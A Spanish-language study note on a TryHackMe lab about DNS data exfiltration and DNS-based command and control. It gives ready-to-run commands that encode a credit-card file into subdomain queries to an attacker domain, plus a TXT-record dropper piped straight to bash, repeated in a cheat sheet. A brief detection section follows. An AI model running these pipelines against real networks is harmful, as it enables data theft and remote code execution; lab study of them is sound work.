---
tags: [red-team, data-exfiltration, dns, base64, c2]
created: 2026-04-22
source: TryHackMe - Data Exfiltration
related:
  - "[[DNS Configurations]]"
  - "[[DNS Tunneling]]"
---

# Exfiltración por DNS

> [!abstract] TL;DR
> Codificar datos sensibles y adjuntarlos como subdominios en consultas DNS dirigidas a un servidor controlado por el atacante. El protocolo DNS raramente se monitorea en profundidad y casi siempre está permitido salir hacia internet, convirtiéndolo en un canal excelente (aunque lento y ruidoso) para evadir firewalls restrictivos.

## Cuándo usarlo

La exfiltración por DNS brilla en entornos altamente seguros donde:
- Se bloquea todo el tráfico TCP saliente (HTTP, HTTPS, SSH) directo a internet.
- Se inspecciona el contenido de paquetes en puertos comunes.
- El único tráfico permitido hacia el exterior son las peticiones DNS (puerto 53 UDP/TCP), habitualmente mediadas por un servidor DNS corporativo interno.

El truco radica en que **no necesitamos hablar directamente con nuestro servidor**. Le pedimos al DNS corporativo que resuelva un subdominio falso, y el DNS corporativo hará el trabajo sucio de enrutar nuestra data exfiltrada a través de internet hasta llegar a nosotros.

## Limitaciones del protocolo DNS

Para no romper el estándar DNS y evitar que los resolvers intermedios descarten nuestras consultas, debemos respetar límites estrictos de tamaño impuestos por la RFC 1035:

1. **Longitud de un "label" (cada parte separada por puntos):** Máximo **63 caracteres**.
2. **Longitud del FQDN completo:** Máximo **255 caracteres** en total.

Por ejemplo, en `este-es-un-label.tunnel.com`, `este-es-un-label` no puede exceder los 63 caracteres.

Debido a estas restricciones, exfiltrar archivos grandes requiere dividirlos en múltiples consultas (`chunks`), lo cual genera un volumen de peticiones DNS inusualmente alto, una señal de advertencia (ruido) para los defensores.

## Flujo general de exfiltración

```
┌─────────────┐                                      ┌─────────────┐
│   VÍCTIMA   │                                      │   ATACANTE  │
│             │                                      │(Name Server)│
│  Base64     │          Consulta DNS                │             │
│    │        │      ¿Qué IP tiene... ?              │ Captura UDP │
│    ▼        ┼──────────────────────────────────────┼▶ tcpdump    │
│  <datos_b64>│     TmFtZ...Cg==.att.tunnel.com      │    │        │
│    │        │                                      │    ▼        │
│  dig +short │ ◀──────────────────────────────────────┼ decodifica│
└─────────────┘          Respuesta DNS (IP)          └─────────────┘
                         (Generalmente falsa)
```

## Preparación: Escuchar en el atacante

Antes de enviar nada, el atacante debe estar listo para capturar las peticiones en su servidor autoritativo (ver [[DNS Configurations]]).

Usamos `tcpdump` para interceptar el tráfico UDP en el puerto 53:

```shell
thm@attacker$ sudo tcpdump -i eth0 udp port 53 -v
```

## Ejecución en la víctima: Preparar y enviar el payload

Supongamos que queremos exfiltrar el archivo `credit.txt`.

### 1. Codificación base
Primero, siempre codificamos en Base64 para garantizar que solo enviamos caracteres válidos para nombres de dominio (alfanuméricos).

```shell
thm@victim2$ cat task9/credit.txt | base64
# TmFtZTogVEhNLXVzZX...Cg==
```

### 2. Segmentación (Chunking) y Envío

Tenemos dos opciones principales para respetar los límites de DNS.

#### Opción A: Una consulta por cada trozo de datos
Cortamos el Base64 en partes pequeñas (ej. 18 o 63 caracteres máximo) y enviamos una consulta separada por cada trozo.

```shell
cat task9/credit.txt | base64 | tr -d "\n" | fold -w18 | sed -r 's/.*/&.att.tunnel.com/'
```
*(Esto solo genera la lista de dominios, luego habría que pasarlos por `dig` o un bucle `for`)*

Esto generará muchas consultas como:
- `TmFtZTogVEhNLXVzZX.att.tunnel.com`
- `IKQWRkcmVzczogMTIz.att.tunnel.com`

**Desventaja:** Extremadamente ruidoso en logs y lento.

#### Opción B: Todo en una sola consulta (Recomendado para datos chicos)
Aprovechamos al máximo los 255 caracteres del FQDN. Cortamos el Base64 en labels válidos (menos de 63 chars, aquí usaremos 18 por legibilidad) separados por puntos `.`, y agregamos nuestro dominio al final.

```shell
cat task9/credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/
```

Esto generará una única (o pocas) cadenas largas:
`TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com`

**Disparo de la consulta real:**

```shell
# Tomamos la cadena generada arriba y la resolvemos
cat task9/credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
```

## Reconstrucción en el atacante

Con `tcpdump` corriendo, veremos la consulta llegar. Ahora debemos extraer solo el subdominio, limpiar nuestro dominio (`.att.tunnel.com`), quitar los puntos y decodificar el Base64.

```shell
# Tomamos el FQDN capturado en tcpdump
echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." \
 | cut -d"." -f1-8 | tr -d "." | base64 -d
```
*(El `cut -d"." -f1-8` extrae los primeros 8 bloques, ignorando el `att.tunnel.com` del final)*

El resultado será el contenido original de `credit.txt`.

---

## Command & Control (C2) sobre DNS con registros TXT

La técnica inversa (meter datos desde el exterior hacia el interior) se usa a menudo para **Command and Control** o para entregar código malicioso (Droppers).

En lugar de usar consultas `A`, la víctima hace peticiones de registros `TXT` (que pueden contener cadenas de texto largas). El atacante coloca comandos o scripts en estos registros en su servidor DNS.

### Flujo de un DNS Dropper

1. **El atacante escribe su script:**
```bash
#!/bin/bash
ping -c 1 test.thm.com
```

2. **Lo codifica y lo aloja en el DNS:**
```shell
cat /tmp/script.sh | base64
# IyEvYmluL2Jhc2gKcGluZyAtYyAxIHRlc3QudGhtLmNvbQo=
```
En el panel de su dominio, crea un registro: `TXT script.tunnel.com IyEvYmluL2...`

3. **La víctima consulta y ejecuta:**
La víctima, mediante un comando inofensivo, descarga el script como texto, lo decodifica y se lo pasa a bash.

```shell
# Consulta y ejecución directa en memoria
dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
```

> [!tip]
> Esta técnica es sumamente evasiva porque el archivo malicioso **nunca toca el disco** de la víctima. Todo ocurre en memoria a través de una consulta DNS rutinaria.

## OPSEC y Detección

Esta técnica es muy visible si la red cuenta con analítica DNS.

1. **Entropía de Subdominios:** Nombres como `TmFtZTogV...` tienen una aleatoriedad (entropía) muy alta en comparación con nombres reales como `mail` o `www`. Herramientas de Machine Learning detectan esto fácilmente.
2. **Longitud Anómala:** Subdominios que frecuentemente se acercan al límite de 63 caracteres son altamente sospechosos.
3. **Volumen de Consultas:** Un pico masivo de peticiones a un mismo dominio raíz (ej. miles de consultas a `*.tunnel.com`) en corto tiempo.

## Comandos Clave

```shell
# Listener atacante
sudo tcpdump -i eth0 udp port 53 -v

# Exfiltración (Todo en una consulta)
cat <file> | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' \
 | tr -d "\n" | sed s/$/att.tunnel.com/ \
 | awk '{print "dig +short " $1}' | bash

# Decodificación en el atacante (limpiar puntos y dominio)
echo "<query>" | cut -d"." -f1-N | tr -d "." | base64 -d

# C2 sobre DNS (Descargar dropper en TXT y ejecutar)
dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
```

## Preguntas y Respuestas

- **¿Cuál es la longitud máxima para el nombre de un subdominio (label)?**
  → `63`
- **El FQDN completo no debe exceder ______ caracteres.**
  → `255`
- **Ejecutá la C2 communication sobre DNS del TXT de `flag.tunnel.com`. ¿Cuál es la flag?**
  → `dig +short -t TXT flag.tunnel.com | tr -d "\"" | base64 -d | bash`